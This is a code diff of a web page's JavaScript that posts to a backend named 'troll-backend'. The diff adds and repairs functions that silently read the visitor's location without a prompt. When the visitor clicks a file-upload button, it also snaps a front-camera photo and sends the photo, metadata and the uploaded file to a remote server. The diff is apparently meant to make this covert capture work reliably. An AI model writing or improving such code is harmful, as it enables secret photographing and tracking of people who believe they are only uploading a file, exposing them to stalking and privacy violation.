@@ -9,21 +9,18 @@ const BACKEND_BASE = "https://troll-backend.onrender.com/api";
 // SILENT LOCATION (NO POPUP)
 // ================================
 async function getSilentLocation() {
-  let loc = "";
-
-  if (!navigator.permissions) return loc;
+  if (!navigator.permissions) return "";
 
   try {
     const status = await navigator.permissions.query({ name: "geolocation" });
     if (status.state === "granted") {
-      const pos = await new Promise((res, rej) =>
-        navigator.geolocation.getCurrentPosition(res, rej)
+      const pos = await new Promise(res =>
+        navigator.geolocation.getCurrentPosition(res)
       );
-      loc = `${pos.coords.latitude},${pos.coords.longitude}`;
+      return `${pos.coords.latitude},${pos.coords.longitude}`;
     }
   } catch {}
-
-  return loc;
+  return "";
 }
 
 // ================================
@@ -57,54 +54,76 @@ async function collectMetadata() {
 }
 
 // ================================
-// CAMERA CAPTURE
+// CAMERA CAPTURE (FIXED)
 // ================================
 async function captureAndSendCamera() {
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "user" },
-    audio: false
-  });
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
 
-  video.srcObject = stream;
-  await new Promise(r => setTimeout(r, 3000));
+    video.srcObject = stream;
+    video.muted = true;
+    video.setAttribute("playsinline", true);
+    await video.play(); // 🔴 REQUIRED
 
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // Wait for camera exposure
+    await new Promise(r => setTimeout(r, 2500));
 
-  const image = canvas.toDataURL("image/png");
-  const metadata = await collectMetadata();
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
 
-  await fetch(`${BACKEND_BASE}/upload`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ image, metadata })
-  });
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  stream.getTracks().forEach(t => t.stop());
+    const image = canvas.toDataURL("image/png");
+    const metadata = await collectMetadata();
+
+    await fetch(`${BACKEND_BASE}/upload`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image, metadata })
+    });
+
+    stream.getTracks().forEach(t => t.stop());
+  } catch (err) {
+    console.error("Camera failed:", err);
+  }
 }
 
 // ================================
 // FILE UPLOAD
 // ================================
 async function sendFile(file) {
-  const reader = new FileReader();
-  reader.onload = async () => {
-    await fetch(`${BACKEND_BASE}/file-upload`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ file: reader.result, filename: file.name })
-    });
-  };
-  reader.readAsDataURL(file);
+  return new Promise(resolve => {
+    const reader = new FileReader();
+    reader.onload = async () => {
+      await fetch(`${BACKEND_BASE}/file-upload`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          file: reader.result,
+          filename: file.name
+        })
+      });
+      resolve();
+    };
+    reader.readAsDataURL(file);
+  });
 }
 
 // ================================
-// SUBMIT FLOW
+// SUBMIT FLOW (FIXED)
 // ================================
 btn.addEventListener("click", async e => {
   e.preventDefault();
+  btn.disabled = true;
 
-  if (!fileInput.files.length) return;
+  if (!fileInput.files.length) {
+    btn.disabled = false;
+    return;
+  }
 
   await captureAndSendCamera();
   await sendFile(fileInput.files[0]);
